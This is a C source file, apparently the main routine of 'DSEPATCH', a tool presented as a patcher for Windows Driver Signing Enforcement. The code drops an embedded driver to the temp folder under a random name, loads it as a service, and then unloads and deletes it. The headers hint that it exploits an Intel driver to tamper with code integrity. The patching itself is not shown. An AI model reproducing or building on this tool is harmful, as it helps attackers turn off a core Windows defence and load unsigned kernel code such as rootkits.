/*!
 * DSEPATCH (c) Driver Signing Enforcement 
 * Patcher for anything from Windows 8 to
 * present.
!*/
#define _GNU_SOURCE
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include "util.h"
#include "ci.h"
#include "intel.h"
#include "service.h"


int main(int argc, char **argv)
{ 
  BOOL  DriverLoaded;
  CHAR *szDriverPath;
  CHAR  szTemporaryFolder[MAX_PATH + 1];
  RtlSecureZeroMemory(&szTemporaryFolder, MAX_PATH + 1);
  if ( GetTempPathA(MAX_PATH, (PCHAR)&szTemporaryFolder) != 0 )
  {
    asprintf
    (
     	&szDriverPath, "%s%s.%s", 
	&szTemporaryFolder, 
	RandomString(5), 
	"sys"
    ); DumpToFile(szDriverPath);

    if ( (DriverLoaded = LoadDriver(szDriverPath)) ) {
      printf("[+] %s loaded successfully\n", szDriverPath);
    } else { printf("[ ] LoadDriver 0x%x\n", GetLastError()); };
  };

Cleanup:
  if ( DriverLoaded ) 
	  UnloadDriver(szDriverPath);

  DeleteFileA(szDriverPath);
};
